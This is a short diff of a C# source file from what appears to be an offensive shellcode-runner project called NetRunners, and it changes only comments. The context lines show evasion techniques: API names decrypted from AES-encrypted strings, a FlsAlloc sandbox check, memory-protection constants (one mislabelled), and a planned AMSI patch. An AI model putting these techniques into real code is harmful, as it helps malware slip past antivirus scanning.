@@ -17,7 +17,7 @@ namespace NetRunners.Data
             string decrypted = System.Text.Encoding.UTF8.GetString(DecryptionAlgorithms.Decryptor.DecryptBytesToBytes_Aes(API_String, AesKey, AesIV));
             return decrypted;
         }
-
+        // flags
         public const uint MEM_COMMIT_RESERVE = 0x00001000 | 0x00002000;
         public const uint PAGE_READWRITE = 0x40;
         public const uint PAGE_EXECUTE_READ = 0x20;
@@ -129,7 +129,7 @@ namespace NetRunners.Data
         public delegate IntPtr pFlsAlloc(IntPtr callback);
         public static pFlsAlloc FlsAlloc = (pFlsAlloc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(FlsAlloc_Byte)), typeof(pFlsAlloc));
 
-        // AMSI Binary Patch for AmsiOpenSession
+        // AMSI Binary Patch for AmsiScanBuffer
         // this technique uses LoadLibrary, GetProcAddess, VirtualProtect
 
         //// import loadlibrary
